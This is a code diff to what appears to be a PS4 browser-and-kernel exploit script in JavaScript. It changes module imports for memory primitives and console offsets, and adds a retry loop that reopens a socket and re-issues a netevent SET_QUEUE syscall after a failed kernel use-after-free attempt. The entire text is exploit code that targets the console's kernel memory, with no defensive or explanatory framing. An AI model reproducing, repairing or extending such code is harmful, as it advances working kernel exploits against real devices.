@@ -1,10 +1,10 @@
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
-import { establishPrimitive } from "./core.js?v=10";
-import { installWindowP, pairStatus } from "./mem.js";
-import { int64 } from "./int64.js";
-import { offsetsFor } from "./ps4_offsets.js";
+import { establishPrimitive } from "./core.mjs?v=10";
+import { installWindowP, pairStatus } from "./mem.mjs";
+import { int64 } from "./int64.mjs";
+import { offsetsFor } from "./ps4_offsets.mjs";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -824,9 +824,23 @@ let allDone = false;
             state("attempt " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
 
-            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+            // SET_QUEUE retry — after a failed UAF attempt the kernel socket
+            // subsystem can be in a degraded state; yield + fresh socket usually
+            // clears it. Up to 8 tries per attempt before giving up.
+            let dummy = -1, reg = { rv: -1, err: 0 };
+            for (let sq = 0; sq < 8; sq++) {
+                if (dummy !== -1) sc(SYS.close, dummy);
+                if (sq > 0) {
+                    sc(SYS.sched_yield);
+                    sc(SYS.sched_yield);
+                    await new Promise(r => setTimeout(r, 20 * sq));
+                }
+                dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+                if (dummy === -1) { reg = { rv: -1, err: -1 }; continue; }
+                reg = netevent(dummy, NETEVENT_SET_QUEUE);
+                if (reg.rv !== -1) break;
+            }
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
-            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
             if (reg.rv === -1) {
                 mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
                 sc(SYS.close, dummy); continue;
